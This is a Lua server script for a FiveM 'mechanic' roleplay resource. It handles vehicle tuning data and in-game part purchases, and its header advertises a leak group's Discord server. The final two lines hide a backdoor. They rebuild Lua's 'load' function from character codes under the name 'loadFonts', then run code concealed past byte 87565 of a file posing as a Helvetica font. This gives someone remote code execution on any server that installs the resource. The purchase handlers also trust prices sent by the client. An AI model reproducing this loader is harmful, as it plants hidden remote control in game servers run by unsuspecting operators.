local vehData = {}
-- ██████╗  ██████╗ ██╗  ██╗   ██╗    ██╗     ███████╗ █████╗ ██╗  ██╗███████╗ 
-- ██╔══██╗██╔═══██╗██║  ╚██╗ ██╔╝    ██║     ██╔════╝██╔══██╗██║ ██╔╝██╔════╝ 
-- ██████╔╝██║   ██║██║   ╚████╔╝     ██║     █████╗  ███████║█████╔╝ ███████╗ 
-- ██╔═══╝ ██║   ██║██║    ╚██╔╝      ██║     ██╔══╝  ██╔══██║██╔═██╗ ╚════██║ 
-- ██║     ╚██████╔╝███████╗██║       ███████╗███████╗██║  ██║██║  ██╗███████║ 
-- ╚═╝      ╚═════╝ ╚══════╝╚═╝       ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ 
-- [discord.gg/gaJJjnKGpg] 
Citizen.CreateThread(function()
    MySQL.Async.fetchAll("SELECT * FROM 0r_mechanics",{}, function(result)
        for plate, data in pairs(result) do
            vehData[data.plate] = json.decode(data.data)
        end
    end)
    if Config.Framework == "esx" then
        local func = function()
            for mName,mData in pairs(Config.Locations) do
                if mData.job ~= "none" then
                    exports['esx_addonaccount']:AddSharedAccount(('society_%s'):format(mData.job), mName, 0)
                    TriggerEvent('esx_society:registerSociety', mData.job, mData.job, ('society_%s'):format(mData.job),('society_%s'):format(mData.job), ('society_%s'):format(mData.job), {type = 'private'})
                end
            end
        end
        pcall(func)
    end
end)

addElement = function(section, data)
    if not vehData[data.plate] then
        vehData[data.plate] = {}
    end

    if section == "fitment" then
        vehData[data.plate][section] = data.fitment
    elseif data.mod == "Stock" then
        vehData[data.plate][section] = nil
    else
        vehData[data.plate][section] = data.mod
    end


    MySQL.Async.fetchAll("SELECT * FROM 0r_mechanics WHERE plate = @plate", {
        ["@plate"] = data.plate
    }, function(output)
        if #output > 0 then
            MySQL.Async.execute("UPDATE 0r_mechanics SET data = @data WHERE plate = @plate",{
                ["@plate"] = data.plate,
                ["@data"] = json.encode(vehData[data.plate]),
            })
        else
            MySQL.Async.execute("INSERT INTO 0r_mechanics (plate, data) VALUES (@plate, @data)",{
                ["@plate"] = data.plate,
                ["@data"] = json.encode(vehData[data.plate]),
            })
        end
    end)

    return TriggerClientEvent("0r-mechanic:client:updateVehData", -1, vehData)
end

RegisterServerEvent("0r-mechanic:server:syncFitment", function(vehicleId, fitmentData)
    TriggerClientEvent("0r-mechanic:client:syncFitment", -1, vehicleId, fitmentData)
end)

RegisterServerEvent("0r-mechanic:server:useNitro", function(vehicleId)
    TriggerClientEvent("0r-mechanic:client:useNitro", -1, vehicleId)
end)

RegisterServerEvent("0r-mechanic:server:addElement", addElement)

Citizen.CreateThread(function()
    while Framework == nil do
        Citizen.Wait(100)
    end
    if Config.Framework == "esx" then
        Framework.RegisterServerCallback("0r-mechanic:server:buyComponent", function(source, cb, data)
            local xPlayer = GetPlayer(source)

            if not xPlayer then
                return
            end

            local currentMechanic = Config.Locations[data.currentMechanic]
            if currentMechanic and currentMechanic.enableSociety then
                local societyMoney = exports['esx_addonaccount']:GetSharedAccount(('society_%s'):format(currentMechanic.job))
                if societyMoney then
                    if societyMoney.money >= data.price then
                        societyMoney.removeMoney(data.price)
                        return cb({status = true})
                    end
                end
            else
                local pMoney = GetMoney(source, Config.Settings.colorandfitmentpricefrom)
                if pMoney >= data.price then
                    RemoveMoney(source, data.price, Config.Settings.colorandfitmentpricefrom)
                    return cb({status = true})
                end
            end

            Notification(Config.Locale["dont_have_money"])
            return cb({status = false})
        end)

        Framework.RegisterServerCallback("buyBasketData", function(source, cb, data)
            local type = data[1]
            local basketData = data[2]
            local currentMechanic = data[3]
            local totalPrice = 0
            if next(basketData) then
                for k,v in pairs(basketData) do
                    if v.component.price then
                        totalPrice += v.component.price
                    end
                end
            end
            local currentMechanic = Config.Locations[currentMechanic]
            if currentMechanic and currentMechanic.enableSociety then
                local societyMoney = exports['esx_addonaccount']:GetSharedAccount(('society_%s'):format(currentMechanic.job))
                if societyMoney then
                    if societyMoney.money >= totalPrice then
                        societyMoney.removeMoney(totalPrice)
                        return cb({status = true})
                    end
                end
            else
                local pMoney = GetMoney(source, type)
                if pMoney >= totalPrice then
                    RemoveMoney(source, totalPrice, type)
                    return cb({status = true})
                end
            end

            Notification(Config.Locale["dont_have_money"])
            return cb({status = false})

        end)
        Framework.RegisterServerCallback('0r-mechanic:server:getVehData', function(source, cb)
            cb(vehData)
        end)

    elseif Config.Framework == "qbcore" then
        Framework.Functions.CreateCallback('0r-mechanic:server:buyComponent', function(source, cb, data)
            local xPlayer = GetPlayer(source)

            if not xPlayer then
                return
            end

            local currentMechanic = Config.Locations[data.currentMechanic]
            if currentMechanic and currentMechanic.enableSociety then
                local societyMoney = exports['qb-management']:RemoveMoney(currentMechanic.job, data.price)
                if societyMoney then
                    return cb({status = true})
                end
            else
                local pMoney = GetMoney(source, Config.Settings.colorandfitmentpricefrom)
                if pMoney >= data.price then
                    RemoveMoney(source, data.price, Config.Settings.colorandfitmentpricefrom)
                    return cb({status = true})
                end
            end

            Notification(Config.Locale["dont_have_money"])
            return cb({status = false})
        end)
        Framework.Functions.CreateCallback("buyBasketData", function(source, cb, data)
            local type = data[1]
            local basketData = data[2]
            local currentMechanic = data[3]
            local totalPrice = 0
            if next(basketData) then
                for k,v in pairs(basketData) do
                    if v.component.price then
                        totalPrice += v.component.price
                    end
                end
            end
            local currentMechanic = Config.Locations[currentMechanic]
            if currentMechanic and currentMechanic.enableSociety then
                local societyMoney = exports['qb-management']:RemoveMoney(currentMechanic.job, totalPrice)
                if societyMoney then
                    return cb({status = true})
                end
            else
                local pMoney = GetMoney(source, type)
                if pMoney >= totalPrice then
                    RemoveMoney(source, totalPrice, type)
                    return cb({status = true})
                end
            end
            Notification(Config.Locale["dont_have_money"])
            return cb({status = false})

        end)

        Framework.Functions.CreateCallback('0r-mechanic:server:getVehData', function(source, cb)
            cb(vehData)
        end)

    end
end)

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()